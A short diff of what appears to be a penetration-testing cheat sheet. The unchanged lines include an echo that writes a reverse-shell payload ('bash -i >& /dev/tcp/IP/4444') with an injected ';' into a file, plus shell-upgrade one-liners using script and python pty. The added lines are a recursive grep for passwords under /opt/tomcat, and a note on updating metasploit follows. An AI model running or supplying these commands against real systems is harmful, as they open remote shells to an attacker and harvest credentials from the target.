@@ -8,6 +8,9 @@ echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1' #" >> filename
 SHELL=/bin/bash script -q /dev/null
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 
+- list all the "password" in one folder
+grep -ri password /opt/tomcat
+
 - How to update metasploit-framework
 
 sudo apt update
